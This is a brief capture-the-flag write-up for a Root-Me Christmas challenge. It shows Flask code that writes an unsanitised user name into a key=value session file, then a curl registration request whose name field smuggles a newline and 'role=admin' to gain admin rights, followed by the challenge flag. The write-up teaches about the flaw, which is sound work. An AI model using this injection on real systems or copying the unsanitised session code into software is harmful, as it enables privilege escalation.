# New New Always New (day15)

<p align="center"><img src="Screenshots/S3.png" alt="Desc"></p>

````python
def create_session(email, name, role):
    session_id = str(uuid.uuid4())
    session_file = os.path.join(SESSION_DIR, f'session_{session_id}.conf')

    with open(session_file, 'w') as f:
        f.write(f'email={email}\n')
        f.write(f'role={role}\n')
        f.write(f'name={name}\n')

    return session_id
````

````python
@app.route('/register', methods=['POST'])
def register():
    email = request.json.get('email')
    name = request.json.get('name')
    password = request.json.get('password')

    password_hash = generate_password_hash(password)

    user = User(email=email, name=name, role='user', password_hash=password_hash)
    db.session.add(user)
    db.session.commit()

    return jsonify(success="User registered successfully"), 201
````

````bash
curl -k -X POST https://day15.challenges.xmas.root-me.org/register -H "Content-Type: application/json" -d '{"email": "user@example.com","name": "Axel2\nrole=admin","password": "azerty"}'
````

<p align="center"><img src="Screenshots/S1.png" alt="Desc"></p>

<p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>

Flag : _RM{I_Thought_Th1s_VUlnerability_W4s_N0t_Imp0rtant}_, thanks _Elweth_ for this challenge !

 
